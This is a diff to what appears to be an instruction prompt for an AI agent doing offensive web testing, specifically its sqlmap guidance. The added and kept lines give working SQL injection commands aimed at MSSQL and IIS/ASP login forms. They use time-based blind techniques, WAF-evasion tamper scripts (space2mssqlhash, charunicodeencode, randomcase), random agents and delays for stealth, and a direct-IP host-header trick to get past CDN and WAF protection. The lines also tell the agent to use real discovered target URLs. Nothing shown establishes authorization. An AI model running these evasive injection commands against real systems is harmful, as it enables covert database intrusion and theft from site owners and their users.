@@ -126,10 +126,12 @@ Speed and stealth:
 sqlmap:
 - To bypass CDN/VPN/WAF DNS: use direct IP with --host-header. Example: sqlmap -u "http://1.2.3.4/login.asp" --host-header "target.com" --data "uid=test&passwd=test" --dbms=mssql --technique=T --delay=2
 - NEVER use --resolve (sqlmap does not support this flag).
-- When using -r (request file): create the req.txt in the SAME script block, not a separate parallel block. Example:
-  printf 'POST /login.asp HTTP/1.1\nHost: target.com\n...' > /tmp/req.txt && sqlmap -r /tmp/req.txt --batch --dbms=mssql
+- NEVER use -r (request file). It causes parallel execution failures. ALWAYS use --data for POST parameters instead:
+  sqlmap -u "https://target.com/login.asp" --data "uid=test&passwd=test&loginmode=1" --batch --dbms=mssql
+- NEVER use placeholder URLs like "http://..." or "https://..." in any command. Always use the ACTUAL discovered target URL with real path.
 - For MSSQL time-based blind behind WAF: --technique=T --time-sec=5 --tamper=space2comment,charencode --delay=3
 - For IIS/ASP behind WebKnight: --tamper=space2mssqlhash,charunicodeencode --random-agent --delay=3
+- Combine tamper+technique for WebKnight: sqlmap -u "https://TARGET/path.asp" --data "PARAMS" --batch --dbms=mssql --technique=BET --level=3 --risk=2 --tamper=space2mssqlhash,charunicodeencode,randomcase --random-agent --delay=2
 
 [CHAT-FIRST RESPONSE STYLE]
 - Explain the current hypothesis, the next meaningful check, and what evidence would confirm or refute it.
